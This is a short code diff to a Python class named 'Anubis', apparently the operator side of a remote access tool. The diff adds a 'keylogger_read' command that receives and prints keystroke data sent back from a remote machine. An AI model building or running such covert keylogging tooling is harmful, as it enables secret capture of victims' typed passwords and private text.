@@ -19,7 +19,7 @@ class Anubis:
         self.__sysinfo_result = None
         self.__data = None
         self.__anubis_command_permitted = ['download', 'upload', 'sysinfo', 'recv_download_file', 'size_download_file',
-                                           'error']
+                                           'error', 'keylogger_read']
         self.__socked_fd = None
         self.__tmp_folder = tools.temp_dir()['message'] + "/osiris-download/"
 
@@ -41,6 +41,8 @@ class Anubis:
                         self._receive_file_size(__value)
                     elif __key == 'recv_download_file':
                         self._recv_download_file(__value)
+                    elif __key == 'keylogger_read':
+                        self._keylogger_read(__value)
                     elif __key == 'error':
                         print_message.execution_error(__value)
                     else:
@@ -142,6 +144,9 @@ class Anubis:
                                                                                               str(self.__filesize) + str(
                                                                                                   " bytes")) + color.color(
             "lgray", " of ") + color.color("yellow", __filename[1]))
+
+    def _keylogger_read(self, __data):
+        print_message.execution_info(__data)
 
 
 anubis = Anubis()
